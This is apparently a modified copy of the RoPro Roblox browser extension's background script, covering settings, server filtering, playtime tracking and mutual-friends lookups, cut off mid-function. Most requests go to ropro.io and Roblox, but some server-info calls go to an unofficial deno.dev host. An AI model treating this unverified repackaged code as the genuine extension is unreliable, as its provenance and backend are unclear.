// By jaitoxd on yt
//RoPro v1.6
//RoPro v2.0 revamp coming soon. RoPro v2.0 is a total rewrite of RoPro using React & Tailwind to make the extension faster, more reliable, and more maintainable.

function getStorage(key) {
  return new Promise((resolve) => {
    chrome.storage.sync.get(key, function (obj) {
      resolve(obj[key]);
    });
  });
}

function setStorage(key, value) {
  return new Promise((resolve) => {
    chrome.storage.sync.set({ [key]: value }, function () {
      resolve();
    });
  });
}

function getLocalStorage(key) {
  return new Promise((resolve) => {
    chrome.storage.local.get(key, function (obj) {
      resolve(obj[key]);
    });
  });
}

function setLocalStorage(key, value) {
  return new Promise((resolve) => {
    chrome.storage.local.set({ [key]: value }, function () {
      resolve();
    });
  });
}

var defaultSettings = {
  buyButton: true,
  comments: true,
  dealCalculations: "rap",
  dealNotifier: true,
  embeddedRolimonsItemLink: true,
  embeddedRolimonsUserLink: true,
  fastestServersSort: true,
  gameLikeRatioFilter: true,
  gameTwitter: true,
  genreFilters: true,
  groupDiscord: true,
  groupRank: true,
  groupTwitter: true,
  featuredToys: true,
  itemPageValueDemand: true,
  linkedDiscord: true,
  liveLikeDislikeFavoriteCounters: true,
  livePlayers: true,
  liveVisits: true,
  roproVoiceServers: true,
  premiumVoiceServers: true,
  moreGameFilters: true,
  additionalServerInfo: true,
  moreServerFilters: true,
  serverInviteLinks: true,
  serverFilters: true,
  mostRecentServer: true,
  randomServer: true,
  tradeAge: true,
  notificationThreshold: 30,
  itemInfoCard: true,
  ownerHistory: true,
  profileThemes: true,
  globalThemes: true,
  lastOnline: true,
  roproEggCollection: true,
  profileValue: true,
  projectedWarningItemPage: true,
  quickItemSearch: true,
  quickTradeResellers: true,
  hideSerials: true,
  quickUserSearch: true,
  randomGame: true,
  popularToday: true,
  reputation: true,
  reputationVote: true,
  sandbox: true,
  sandboxOutfits: true,
  serverSizeSort: true,
  singleSessionMode: false,
  tradeDemandRatingCalculator: true,
  tradeItemDemand: true,
  tradeItemValue: true,
  tradeNotifier: true,
  tradeOffersPage: true,
  tradeOffersSection: true,
  tradeOffersValueCalculator: true,
  tradePageProjectedWarning: true,
  tradePreviews: true,
  tradeProtection: true,
  tradeValueCalculator: true,
  moreTradePanel: true,
  valueThreshold: 0,
  hideTradeBots: true,
  autoDeclineTradeBots: true,
  hideDeclinedNotifications: true,
  hideOutboundNotifications: false,
  tradePanel: true,
  quickDecline: true,
  quickCancel: true,
  roproIcon: true,
  underOverRAP: true,
  winLossDisplay: true,
  mostPlayedGames: true,
  allExperiences: true,
  roproShuffle: true,
  experienceQuickSearch: true,
  experienceQuickPlay: true,
  avatarEditorChanges: true,
  playtimeTracking: true,
  activeServerCount: true,
  morePlaytimeSorts: true,
  roproBadge: true,
  mutualFriends: true,
  moreMutuals: true,
  animatedProfileThemes: true,
  cloudPlay: true,
  cloudPlayActive: false,
  hidePrivateServers: false,
  quickEquipItem: true,
  roproWishlist: true,
  themeColorAdjustments: true,
  tradeSearch: true,
  advancedTradeSearch: true,
};

const getDisabledFeatures = async () => {
  fetch("https://api.ropro.io/disabledFeatures.php", { method: "POST" }).then(
    async (response) => {
      if (response.ok) {
        var disabledFeaturesString = await response.text();
        disabledFeatures = disabledFeaturesString.split(",");
        setLocalStorage("disabledFeatures", disabledFeatures);
      }
    }
  );
};

async function initializeSettings() {
  return new Promise((resolve) => {
    async function checkSettings() {
      var initialSettings = await getStorage("rpSettings");
      if (typeof initialSettings === "undefined") {
        await setStorage("rpSettings", defaultSettings);
        resolve();
      } else {
        var changed = false;
        for (var key in Object.keys(defaultSettings)) {
          var settingKey = Object.keys(defaultSettings)[key];
          if (!(settingKey in initialSettings)) {
            initialSettings[settingKey] = defaultSettings[settingKey];
            changed = true;
          }
        }
        if (changed) {
          console.log("SETTINGS UPDATED");
          await setStorage("rpSettings", initialSettings);
        }
      }
      var userVerification = await getStorage("userVerification");
      if (typeof userVerification === "undefined") {
        await setStorage("userVerification", {});
      }
      await setStorage("rpSettings", initialSettings);
    }
    checkSettings();
  });
}

async function initializeRoPro() {
  initializeSettings();
  var avatarBackground = await getStorage("avatarBackground");
  if (typeof avatarBackground === "undefined") {
    await setStorage("avatarBackground", "default");
  }
  var globalTheme = await getStorage("globalTheme");
  if (typeof globalTheme === "undefined") {
    await setStorage("globalTheme", "");
  }
  try {
    var myId = await getStorage("rpUserID");
    if (
      typeof myId != "undefined" &&
      (await loadSettings("globalThemes")) &&
      (!(await getLocalStorage("themeCheck")) ||
        new Date().getTime() - (await getLocalStorage("themeCheck")) >
          600 * 1000)
    ) {
      setLocalStorage("themeCheck", new Date().getTime());
      loadGlobalTheme();
    }
  } catch (e) {
    console.log(e);
  }
}

initializeRoPro();

async function binarySearchServers(gameID, playerCount, maxLoops = 20) {
  async function getServerIndexPage(gameID, index) {
    return new Promise((resolve2) => {
      fetch(
        "https://api.ropro.io/getServerCursor.php?startIndex=" +
          index +
          "&placeId=" +
          gameID
      )
        .then((response) => response.json())
        .then((data) => {
          var cursor = data.cursor == null ? "" : data.cursor;
          fetch(
            "https://games.roblox.com/v1/games/" +
              gameID +
              "/servers/Public?cursor=" +
              cursor +
              "&sortOrder=Asc&limit=100"
          )
            .then((response) => response.json())
            .then((data) => {
              resolve2(data);
            });
        });
    });
  }
  return new Promise((resolve) => {
    var numLoops = 0;
    fetch(
      "https://api.ropro.io/getServerCursor.php?startIndex=0&placeId=" + gameID
    )
      .then((response) => response.json())
      .then(async (data) => {
        var bounds = [
          parseInt(data.bounds[0] / 100),
          parseInt(data.bounds[1] / 100),
        ];
        var index = null;
        while (bounds[0] <= bounds[1] && numLoops < maxLoops) {
          var mid = parseInt((bounds[0] + bounds[1]) / 2);
          var servers = await getServerIndexPage(gameID, mid * 100);
          await roproSleep(500);
          var minPlaying = -1;
          if (servers.data.length > 0) {
            if (servers.data[0].playerTokens.length > playerCount) {
              bounds[1] = mid - 1;
            } else if (
              servers.data[servers.data.length - 1].playerTokens.length <
              playerCount
            ) {
              bounds[0] = mid + 1;
            } else {
              index = mid;
              break;
            }
          } else {
            bounds[0] = mid + 1;
          }
          numLoops++;
        }
        if (index == null) {
          index = bounds[1];
        }
        resolve(index * 100);
      });
  });
}
async function maxPlayerCount(gameID, count) {
  return new Promise((resolve) => {
    async function doMaxPlayerCount(gameID, count, resolve) {
      var index = await binarySearchServers(gameID, count, 20);
      fetch(
        "https://api.ropro.io/getServerCursor.php?startIndex=" +
          index +
          "&placeId=" +
          gameID
      )
        .then((response) => response.json())
        .then(async (data) => {
          var cursor = data.cursor == null ? "" : data.cursor;
          var serverDict = {};
          var serverArray = [];
          var numLoops = 0;
          var done = false;
          function getReversePage(cursor) {
            return new Promise((resolve2) => {
              fetch(
                "https://games.roblox.com/v1/games/" +
                  gameID +
                  "/servers/Public?cursor=" +
                  cursor +
                  "&sortOrder=Asc&limit=100"
              )
                .then((response) => response.json())
                .then((data) => {
                  if (data.hasOwnProperty("data")) {
                    for (var i = 0; i < data.data.length; i++) {
                      serverDict[data.data[i].id] = data.data[i];
                    }
                  }
                  resolve2(data);
                });
            });
          }
          while (
            !done &&
            Object.keys(serverDict).length <= 150 &&
            numLoops < 10
          ) {
            var servers = await getReversePage(cursor);
            await roproSleep(500);
            if (
              servers.hasOwnProperty("previousPageCursor") &&
              servers.previousPageCursor != null
            ) {
              cursor = servers.previousPageCursor;
            } else {
              done = true;
            }
            numLoops++;
          }
          var keys = Object.keys(serverDict);
          for (var i = 0; i < keys.length; i++) {
            if (
              serverDict[keys[i]].hasOwnProperty("playing") &&
              serverDict[keys[i]].playing <= count
            ) {
              serverArray.push(serverDict[keys[i]]);
            }
          }
          serverArray.sort(function (a, b) {
            return b.playing - a.playing;
          });
          console.log(serverArray);
          resolve(serverArray);
        });
    }
    doMaxPlayerCount(gameID, count, resolve);
  });
}

function shuffleArray(array) {
  for (let i = array.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [array[i], array[j]] = [array[j], array[i]];
  }
}

async function serverFilterReverseOrder(gameID) {
  return new Promise((resolve) => {
    async function doReverseOrder(gameID, resolve) {
      fetch(
        "https://api.ropro.io/getServerCursor.php?startIndex=0&placeId=" +
          gameID
      )
        .then((response) => response.json())
        .then(async (data) => {
          var cursor = data.cursor == null ? "" : data.cursor;
          var serverDict = {};
          var serverArray = [];
          var numLoops = 0;
          var done = false;
          function getReversePage(cursor) {
            return new Promise((resolve2) => {
              fetch(
                "https://games.roblox.com/v1/games/" +
                  gameID +
                  "/servers/Public?cursor=" +
                  cursor +
                  "&sortOrder=Asc&limit=100"
              )
                .then((response) => response.json())
                .then((data) => {
                  if (data.hasOwnProperty("data")) {
                    for (var i = 0; i < data.data.length; i++) {
                      serverDict[data.data[i].id] = data.data[i];
                    }
                  }
                  resolve2(data);
                });
            });
          }
          while (
            !done &&
            Object.keys(serverDict).length <= 150 &&
            numLoops < 20
          ) {
            var servers = await getReversePage(cursor);
            await roproSleep(500);
            if (
              servers.hasOwnProperty("nextPageCursor") &&
              servers.nextPageCursor != null
            ) {
              cursor = servers.nextPageCursor;
            } else {
              done = true;
            }
            numLoops++;
          }
          var keys = Object.keys(serverDict);
          for (var i = 0; i < keys.length; i++) {
            if (serverDict[keys[i]].hasOwnProperty("playing")) {
              serverArray.push(serverDict[keys[i]]);
            }
          }
          serverArray.sort(function (a, b) {
            return a.playing - b.playing;
          });
          resolve(serverArray);
        });
    }
    doReverseOrder(gameID, resolve);
  });
}

async function serverFilterRandomShuffle(gameID, minServers = 150) {
  return new Promise((resolve) => {
    async function doRandomShuffle(gameID, resolve) {
      fetch(
        "https://api.ropro.io/getServerCursor.php?startIndex=0&placeId=" +
          gameID
      )
        .then((response) => response.json())
        .then(async (data) => {
          var indexArray = [];
          var serverDict = {};
          var serverArray = [];
          var done = false;
          var numLoops = 0;
          for (var i = data.bounds[0]; i <= data.bounds[1]; i = i + 100) {
            indexArray.push(i);
          }
          function getIndex() {
            return new Promise((resolve2) => {
              if (indexArray.length > 0) {
                var i = Math.floor(Math.random() * indexArray.length);
                var index = indexArray[i];
                indexArray.splice(i, 1);
                fetch(
                  "https://api.ropro.io/getServerCursor.php?startIndex=" +
                    index +
                    "&placeId=" +
                    gameID
                )
                  .then((response) => response.json())
                  .then(async (data) => {
                    var cursor = data.cursor;
                    if (cursor == null) {
                      cursor = "";
                    }
                    fetch(
                      "https://games.roblox.com/v1/games/" +
                        gameID +
                        "/servers/Public?cursor=" +
                        cursor +
                        "&sortOrder=Asc&limit=100"
                    )
                      .then(async (response) => {
                        if (response.ok) {
                          return await response.json();
                        } else {
                          throw new Error("Failed to fetch servers");
                        }
                      })
                      .then(async (data) => {
                        if (data.hasOwnProperty("data")) {
                          for (var i = 0; i < data.data.length; i++) {
                            if (
                              data.data[i].hasOwnProperty("playing") &&
                              data.data[i].playing < data.data[i].maxPlayers
                            ) {
                              serverDict[data.data[i].id] = data.data[i];
                            }
                          }
                        }
                        resolve2();
                      })
                      .catch(function () {
                        done = true;
                        resolve2();
                      });
                  });
              } else {
                done = true;
                resolve2();
              }
            });
          }
          while (
            !done &&
            Object.keys(serverDict).length <= minServers &&
            numLoops < 20
          ) {
            await getIndex();
            await roproSleep(500);
            numLoops++;
          }
          var keys = Object.keys(serverDict);
          for (var i = 0; i < keys.length; i++) {
            serverArray.push(serverDict[keys[i]]);
          }
          resolve(serverArray);
        });
    }
    doRandomShuffle(gameID, resolve);
  });
}

async function fetchServerInfo(placeID, servers) {
  return new Promise((resolve) => {
    var formData = new FormData();
    formData.append(
      "data",
      JSON.stringify({ placeID: placeID, servers: servers })
    );
    fetch("https://roprobackend.deno.dev/getServerInfo.php///api?form", {
      method: "POST",
      body: formData,
    })
      .then((response) => response.json())
      .then((data) => {
        resolve(data);
      });
  });
}

async function fetchServerConnectionScore(placeID, servers) {
  return new Promise((resolve) => {
    var formData = new FormData();
    formData.append(
      "data",
      JSON.stringify({ placeID: placeID, servers: servers })
    );
    fetch("https://roprobackend.deno.dev/getServerConnectionScore.php///api?form", {
      method: "POST",
      body: formData,
    })
      .then((response) => response.json())
      .then((data) => {
        resolve(data);
      });
  });
}

async function fetchServerAge(placeID, servers) {
  return new Promise((resolve) => {
    var formData = new FormData();
    formData.append("placeID", placeID);
    formData.append("servers", JSON.stringify(servers));
    fetch("https://roprobackend.deno.dev/getServerAge.php///api", {
      method: "POST",
      body: formData,
    })
      .then((response) => response.json())
      .then((data) => {
        resolve(data);
      });
  });
}

async function serverFilterRegion(gameID, location) {
  return new Promise((resolve) => {
    async function doServerFilterRegion(gameID, resolve) {
      var serverArray = await serverFilterRandomShuffle(gameID, 250);
      var serverList = [];
      var serverSet = {};
      shuffleArray(serverArray);
      async function checkLocations(serverArray) {
        var serversDict = {};
        for (var i = 0; i < serverArray.length; i++) {
          serversDict[serverArray[i].id] = serverArray[i];
        }
        var serverInfo = await fetchServerInfo(
          gameID,
          Object.keys(serversDict)
        );
        for (var i = 0; i < serverInfo.length; i++) {
          if (
            serverInfo[i].location == location &&
            !(serverInfo[i].server in serverSet)
          ) {
            serverList.push(serversDict[serverInfo[i].server]);
            serverSet[serverInfo[i].server] = true;
          }
        }
        console.log(serverList);
        resolve(serverList);
      }
      checkLocations(serverArray);
    }
    doServerFilterRegion(gameID, resolve);
  });
}

async function serverFilterBestConnection(gameID) {
  return new Promise((resolve) => {
    async function doServerFilterBestConnection(gameID, resolve) {
      var serverArray = await serverFilterRandomShuffle(gameID, 250);
      var serverList = [];
      var serverSet = {};
      shuffleArray(serverArray);
      async function checkLocations(serverArray) {
        var serversDict = {};
        for (var i = 0; i < serverArray.length; i++) {
          serversDict[serverArray[i].id] = serverArray[i];
        }
        var serverInfo = await fetchServerConnectionScore(
          gameID,
          Object.keys(serversDict)
        );
        for (var i = 0; i < serverInfo.length; i++) {
          serversDict[serverInfo[i].server]["score"] = serverInfo[i].score;
          serverList.push(serversDict[serverInfo[i].server]);
        }
        serverList = serverList.sort(function (a, b) {
          return a["score"] < b["score"] ? -1 : a["score"] > b["score"] ? 1 : 0;
        });
        resolve(serverList);
      }
      checkLocations(serverArray);
    }
    doServerFilterBestConnection(gameID, resolve);
  });
}

async function serverFilterNewestServers(gameID) {
  return new Promise((resolve) => {
    async function doServerFilterNewestServers(gameID, resolve) {
      var serverArray = await serverFilterRandomShuffle(gameID, 250);
      var serverList = [];
      var serverSet = {};
      shuffleArray(serverArray);
      async function checkAge(serverArray) {
        var serversDict = {};
        for (var i = 0; i < serverArray.length; i++) {
          serversDict[serverArray[i].id] = serverArray[i];
        }
        var serverInfo = await fetchServerAge(gameID, Object.keys(serversDict));
        for (var i = 0; i < serverInfo.length; i++) {
          serversDict[serverInfo[i].server]["age"] = serverInfo[i].age;
          serverList.push(serversDict[serverInfo[i].server]);
        }
        serverList = serverList.sort(function (a, b) {
          return a["age"] < b["age"] ? -1 : a["age"] > b["age"] ? 1 : 0;
        });
        resolve(serverList);
      }
      checkAge(serverArray);
    }
    doServerFilterNewestServers(gameID, resolve);
  });
}

async function serverFilterOldestServers(gameID) {
  return new Promise((resolve) => {
    async function doServerFilterOldestServers(gameID, resolve) {
      var serverArray = await serverFilterRandomShuffle(gameID, 250);
      var serverList = [];
      var serverSet = {};
      shuffleArray(serverArray);
      async function checkAge(serverArray) {
        var serversDict = {};
        for (var i = 0; i < serverArray.length; i++) {
          serversDict[serverArray[i].id] = serverArray[i];
        }
        var serverInfo = await fetchServerAge(gameID, Object.keys(serversDict));
        for (var i = 0; i < serverInfo.length; i++) {
          serversDict[serverInfo[i].server]["age"] = serverInfo[i].age;
          serverList.push(serversDict[serverInfo[i].server]);
        }
        serverList = serverList.sort(function (a, b) {
          return a["age"] < b["age"] ? 1 : a["age"] > b["age"] ? -1 : 0;
        });
        resolve(serverList);
      }
      checkAge(serverArray);
    }
    doServerFilterOldestServers(gameID, resolve);
  });
}

async function roproSleep(ms) {
  return new Promise((resolve) => {
    setTimeout(function () {
      resolve();
    }, ms);
  });
}

async function getServerPage(gameID, cursor) {
  return new Promise((resolve) => {
    fetch(
      "https://games.roblox.com/v1/games/" +
        gameID +
        "/servers/Public?limit=100&cursor=" +
        cursor
    )
      .then((response) => response.json())
      .then(async (data) => {
        resolve(data);
      })
      .catch(function () {
        resolve({});
      });
  });
}

async function randomServer(gameID) {
  return new Promise((resolve) => {
    fetch(
      "https://games.roblox.com/v1/games/" +
        gameID +
        "/servers/Friend?limit=100"
    )
      .then((response) => response.json())
      .then(async (data) => {
        var friendServers = [];
        for (var i = 0; i < data.data.length; i++) {
          friendServers.push(data.data[i]["id"]);
        }
        var serverList = new Set();
        var done = false;
        var numLoops = 0;
        var cursor = "";
        while (!done && serverList.size < 150 && numLoops < 5) {
          var serverPage = await getServerPage(gameID, cursor);
          await roproSleep(500);
          if (serverPage.hasOwnProperty("data")) {
            for (var i = 0; i < serverPage.data.length; i++) {
              var server = serverPage.data[i];
              if (
                !friendServers.includes(server.id) &&
                server.playing < server.maxPlayers
              ) {
                serverList.add(server);
              }
            }
          }
          if (serverPage.hasOwnProperty("nextPageCursor")) {
            cursor = serverPage.nextPageCursor;
            if (cursor == null) {
              done = true;
            }
          } else {
            done = true;
          }
          numLoops++;
        }
        if (!done && serverList.size == 0) {
          //No servers found via linear cursoring but end of server list not reached, try randomly selecting servers.
          console.log(
            "No servers found via linear cursoring but end of server list not reached, lets try randomly selecting servers."
          );
          var servers = await serverFilterRandomShuffle(gameID, 50);
          for (var i = 0; i < servers.length; i++) {
            var server = servers[i];
            if (
              !friendServers.includes(server.id) &&
              server.playing < server.maxPlayers
            ) {
              serverList.add(server);
            }
          }
        }
        serverList = Array.from(serverList);
        if (serverList.length > 0) {
          resolve(serverList[Math.floor(Math.random() * serverList.length)]);
        } else {
          resolve(null);
        }
      });
  });
}

async function getTimePlayed() {
  var playtimeTracking = await loadSettings("playtimeTracking");
  var mostRecentServer = await loadSettings("mostRecentServer");
  if (playtimeTracking || mostRecentServer) {
    var userID = await getStorage("rpUserID");
    if (playtimeTracking) {
      var timePlayed = await getLocalStorage("timePlayed");
      if (typeof timePlayed == "undefined") {
        timePlayed = {};
        setLocalStorage("timePlayed", timePlayed);
      }
    }
    if (mostRecentServer) {
      var mostRecentServers = await getLocalStorage("mostRecentServers");
      if (typeof mostRecentServers == "undefined") {
        mostRecentServers = {};
        setLocalStorage("mostRecentServers", mostRecentServers);
      }
    }
    fetch("https://presence.roblox.com/v1/presence/users", {
      method: "POST",
      body: JSON.stringify({ userIds: [userID] }),
    })
      .then((response) => response.json())
      .then(async (data) => {
        var placeId = data.userPresences[0].placeId;
        var universeId = data.userPresences[0].universeId;
        if (
          placeId != null &&
          universeId != null &&
          data.userPresences[0].userPresenceType != 3
        ) {
          if (playtimeTracking) {
            if (universeId in timePlayed) {
              timePlayed[universeId] = [
                timePlayed[universeId][0] + 1,
                new Date().getTime(),
                true,
              ];
            } else {
              timePlayed[universeId] = [1, new Date().getTime(), true];
            }
            if (timePlayed[universeId][0] >= 30) {
              timePlayed[universeId] = [0, new Date().getTime(), true];
              var verificationDict = await getStorage("userVerification");
              userID = await getStorage("rpUserID");
              var roproVerificationToken = "none";
              if (typeof verificationDict != "undefined") {
                if (verificationDict.hasOwnProperty(userID)) {
                  roproVerificationToken = verificationDict[userID];
                }
              }
              fetch(
                "https://api.ropro.io/postTimePlayed.php?gameid=" +
                  placeId +
                  "&universeid=" +
                  universeId,
                {
                  method: "POST",
                  headers: {
                    "ropro-verification": roproVerificationToken,
                    "ropro-id": userID,
                  },
                }
              );
            }
            setLocalStorage("timePlayed", timePlayed);
          }
          if (mostRecentServer) {
            var gameId = data.userPresences[0].gameId;
            if (gameId != null) {
              mostRecentServers[universeId] = [
                placeId,
                gameId,
                userID,
                new Date().getTime(),
              ];
              setLocalStorage("mostRecentServers", mostRecentServers);
            }
          }
        }
      });
  }
}

function range(start, end) {
  var foo = [];
  for (var i = start; i <= end; i++) {
    foo.push(i);
  }
  return foo;
}

function stripTags(s) {
  if (typeof s == "undefined") {
    return s;
  }
  return s
    .replace(/(<([^>]+)>)/gi, "")
    .replace(/</g, "")
    .replace(/>/g, "")
    .replace(/'/g, "")
    .replace(/"/g, "")
    .replace(/`/g, "");
}

async function mutualFriends(userId) {
  return new Promise((resolve) => {
    async function doGet() {
      var myId = await getStorage("rpUserID");
      var friendCache = await getLocalStorage("friendCache");
      console.log(friendCache);
      if (
        typeof friendCache == "undefined" ||
        new Date().getTime() - friendCache["expiration"] > 300000
      ) {
        fetch("https://friends.roblox.com/v1/users/" + myId + "/friends")
          .then((response) => response.json())
          .then((myFriends) => {
            setLocalStorage("friendCache", {
              friends: myFriends,
              expiration: new Date().getTime(),
            });
            fetch("https://friends.roblox.com/v1/users/" + userId + "/friends")
              .then((response) => response.json())
              .then(async (theirFriends) => {
                var friends = {};
                for (var i = 0; i < myFriends.data.length; i++) {
                  var friend = myFriends.data[i];
                  friends[friend.id] = friend;
                }
                var mutuals = [];
                for (var i = 0; i < theirFriends.data.length; i++) {
                  var friend = theirFriends.data[i];
                  if (friend.id in friends) {
                    mutuals.push({
                      name: stripTags(friend.name),
                      link: "/users/" + parseInt(friend.id) + "/profile",
                      icon:
                        "https://www.roblox.com/headshot-thumbnail/image?userId=" +
                        parseInt(friend.id) +
                        "&width=420&height=420&format=png",
                      additional: friend.isOnline ? "Online" : "Offline",
                    });
                  }
                }
                console.log("Mutual Friends:", mutuals);
                resolve(mutuals);
              });
          });
      } else {
        var myFriends = friendCache["friends"];
        console.log("cached");
        console.log(friendCache);
        fetch("https://friends.roblox.com/v1/users/" + userId + "/friends")
          .then((response) => response.json())
          .then((theirFriends) => {
            var friends = {};
            for (var i = 0; i < myFriends.data.length; i++) {
              var friend = myFriends.data[i];
              friends[friend.id] = friend;
            }
            var mutuals = [];
            for (var i = 0; i < theirFriends.data.length; i++) {
              var friend = theirFriends.data[i];
              if (friend.id in friends) {
                mutuals.push({
                  name: stripTags(friend.name),
                  link: "/users/" + parseInt(friend.id) + "/profile",
                  icon:
                    "https://www.roblox.com/headshot-thumbnail/image?userId=" +
                    parseInt(friend.id) +
                    "&width=420&height=420&format=png",
                  additional: friend.isOnline ? "Online" : "Offline",
                });
              }
            }
            console.log("Mutual Friends:", mutuals);
            resolve(mutuals);
          });
      }
    }
    doGet();
  });
}

async function mutualFollowing(userId) {
  return new Promise((resolve) => {
    async function doGet() {
      var myId = await getStorage("rpUserID");
      fetch(
        "https://friends.roblox.com/v1/users/" +
          myId +
          "/followings?sortOrder=Desc&limit=100"
      )
        .then((response) => response.json())
        .then((myFriends) => {
          fetch(
            "https://friends.roblox.com/v1/users/" +
              userId +
              "/followings?sortOrder=Desc&limit=100"
          )
            .then((response) => response.json())
            .then((theirFriends) => {
              var friends = {};
              for (var i = 0; i < myFriends.data.length; i++) {
                var friend = myFriends.data[i];
                friends[friend.id] = friend;
              }
              var mutuals = [];
              for (var i = 0; i < theirFriends.data.length; i++) {
                var friend = theirFriends.data[i];
                if (friend.id in friends) {
                  mutuals.push({
                    name: stripTags(friend.name),
                    link: "/users/" + parseInt(friend.id) + "/profile",
                    icon:
                      "https://www.roblox.com/headshot-thumbnail/image?userId=" +
                      parseInt(friend.id) +
                      "&width=420&height=420&format=png",
                    additional: friend.isOnline ? "Online" : "Offline",
                  });
                }
              }
              console.log("Mutual Following:", mutuals);
              resolve(mutuals);
            });
        });
    }
    doGet();
  });
}

async function mutualFollowers(userId) {
  return new Promise((resolve) => {
    async function doGet() {
      var myId = await getStorage("rpUserID");
      fetch(
        "https://friends.roblox.com/v1/users/" +
          myId +
          "/followers?sortOrder=Desc&limit=100"
      )
        .then((response) => response.json())
        .then((myFriends) => {
          fetch(
            "https://friends.roblox.com/v1/users/" +
              userId +
              "/followers?sortOrder=Desc&limit=100"
          )
            .then((response) => response.json())
            .then((theirFriends) => {
              var friends = {};
              for (var i = 0; i < myFriends.data.length; i++) {
                var friend = myFriends.data[i];
                friends[friend.id] = friend;
              }
              var mutuals = [];
              for (var i = 0; i < theirFriends.data.length; i++) {
                var friend = theirFriends.data[i];
                if (friend.id in friends) {
                  mutuals.push({
                    name: stripTags(friend.name),
                    link: "/users/" + parseInt(friend.id) + "/profile",
                    icon:
                      "https://www.roblox.com/headshot-thumbnail/image?userId=" +
                      parseInt(friend.id) +
                      "&width=420&height=420&format=png",
                    additional: friend.isOnline ? "Online" : "Offline",
                  });
                }
              }
              console.log("Mutual Followers:", mutuals);
              resolve(mutuals);
            });
        });
    }
    doGet();
  });
}

async function mutualFavorites(userId, assetType) {
  return new Promise((resolve) => {
    async function doGet() {
      var myId = await getStorage("rpUserID");
      fetch(
        "https://www.roblox.com/users/favorites/list-json?assetTypeId=" +
          assetType +
          "&itemsPerPage=10000&pageNumber=1&userId=" +
          myId
      )
        .then((response) => response.json())
        .then((myFavorites) => {
          fetch(
            "https://www.roblox.com/users/favorites/list-json?assetTypeId=" +
              assetType +
              "&itemsPerPage=10000&pageNumber=1&userId=" +
              userId
          )
            .then((response) => response.json())
            .then((theirFavorites) => {
              var favorites = {};
              for (var i = 0; i < myFavorites.Data.Items.length; i++) {
                var favorite = myFavorites.Data.Items[i];
                favorites[favorite.Item.AssetId] = favorite;
              }
              var mutuals = [];
              for (var i = 0; i < theirFavorites.Data.Items.length; i++) {
                var favorite = theirFavorites.Data.Items[i];
                if (favorite.Item.AssetId in favorites) {
                  mutuals.push({
                    name: stripTags(favorite.Item.Name),
                    link: stripTags(favorite.Item.AbsoluteUrl),
                    icon: favorite.Thumbnail.Url,
                    additional: "By " + stripTags(favorite.Creator.Name),
                  });
                }
              }
              console.log("Mutual Favorites:", mutuals);
              resolve(mutuals);
            });
        });
    }
    doGet();
  });
}

async function mutualGroups(userId) {
  return new Promise((resolve) => {
    async function doGet() {
      var myId = await getStorage("rpUserID");
      var d = {};
      fetch("https://groups.roblox.com/v1/users/" + myId + "/groups/roles")
        .then((response) => response.json())
        .then((groups) => {
          for (var i = 0; i < groups.data.length; i++) {
            d[groups.data[i].group.id] = true;
          }
          var mutualsJSON = [];
          var mutuals = [];
          fetch(
            "https://groups.roblox.com/v1/users/" + userId + "/groups/roles"
          )
            .then((response) => response.json())
            .then((groups) => {
              for (var i = 0; i < groups.data.length; i++) {
                if (groups.data[i].group.id in d) {
                  mutualsJSON.push({ groupId: groups.data[i].group.id });
                  mutuals.push({
                    id: groups.data[i].group.id,
                    name: stripTags(groups.data[i].group.name),
                    link: stripTags(
                      "https://www.roblox.com/groups/" +
                        groups.data[i].group.id +
                        "/group"
                    ),
                    icon: "https://t0.rbxcdn.com/75c8a07ec89b142d63d9b8d91be23b26",
                    additional: groups.data[i].group.memberCount + " Members",
                  });
                }
              }
              fetch(
                "https://www.roblox.com/group-thumbnails?params=" +
                  JSON.stringify(mutualsJSON)
              )
                .then((response) => response.json())
                .then((data) => {
                  for (var i = 0; i < data.length; i++) {
                    d[data[i].id] = data[i].thumbnailUrl;
                  }
                  for (var i = 0; i < mutuals.length; i++) {
                    mutuals[i].icon = d[mutuals[i].id];
                  }
                  console.log("Mutual Groups:", mutuals);
                  resolve(mutuals);
                });
            });
        });
    }
    doGet();
  });
}

async function mutualItems(userId) {
  return new Promise((resolve) => {
    async function doGet() {
      var myId = await getStorage("rpUserID");
      var myItems = await loadItems(
        myId,
        "Hat,Face,Gear,Package,HairAccessory,FaceAccessory,NeckAccessory,ShoulderAccessory,FrontAccessory,BackAccessory,WaistAccessory,Shirt,Pants"
      );
      try {
        var theirItems = await loadItems(
          userId,
          "Hat,Face,Gear,Package,HairAccessory,FaceAccessory,NeckAccessory,ShoulderAccessory,FrontAccessory,BackAccessory,WaistAccessory,Shirt,Pants"
        );
      } catch (err) {
        resolve([{ error: true }]);
      }
      var mutuals = [];
      for (let item in theirItems) {
        if (item in myItems) {
          mutuals.push({
            name: stripTags(myItems[item].name),
            link: stripTags(
              "https://www.roblox.com/catalog/" + myItems[item].assetId
            ),
            icon:
              "https://api.ropro.io/getAssetThumbnail.php?id=" +
              myItems[item].assetId,
            additional: "",
          });
        }
      }
      console.log("Mutual Items:", mutuals);
      resolve(mutuals);
    }
    doGet();
  });
}

async function mutualLimiteds(userId) {
  return new Promise((resolve) => {
    async function doGet() {
      var myId = await getStorage("rpUserID");
      var myLimiteds = await loadInventory(myId);
      try {
        var theirLimiteds = await loadInventory(userId);
      } catch (err) {
        resolve([{ error: true }]);
      }
      var mutuals = [];
      for (let item in theirLimiteds) {
        if (item in myLimiteds) {
          mutuals.push({
            name: stripTags(myLimiteds[item].name),
            link: stripTags(
              "https://www.roblox.com/catalog/" + myLimiteds[item].assetId
            ),
            icon:
              "https://api.ropro.io/getAssetThumbnail.php?id=" +
              myLimiteds[item].assetId,
            additional: "Quantity: " + parseInt(theirLimiteds[item].quantity),
          });
        }
      }
      console.log("Mutual Limiteds:", mutuals);
      resolve(mutuals);
    }
    doGet();
  });
}

async function getPage(userID, assetType, cursor) {
  return new Promise((resolve) => {
    function getPage(resolve, userID, cursor, assetType) {
      fetch(
        `https://inventory.roblox.com/v1/users/${userID}/assets/collectibles?cursor=${cursor}&limit=50&sortOrder=Desc${
          assetType == null ? "" : "&assetType=" + assetType
        }`
      )
        .then((response) => {
          if (response.status == 429) {
            setTimeout(function () {
              getPage(resolve, userID, cursor, assetType);
            }, 21000);
          } else {
            response.json().then((data) => {
              resolve(data);
            });
          }
        })
        .catch(function (r, e, s) {
          resolve({ previousPageCursor: null, nextPageCursor: null, data: [] });
        });
    }
    getPage(resolve, userID, cursor, assetType);
  });
}

async function getInventoryPage(userID, assetTypes, cursor) {
  return new Promise((resolve) => {
    fetch(
      "https://inventory.roblox.com/v2/users/" +
        userID +
        "/inventory?assetTypes=" +
        assetTypes +
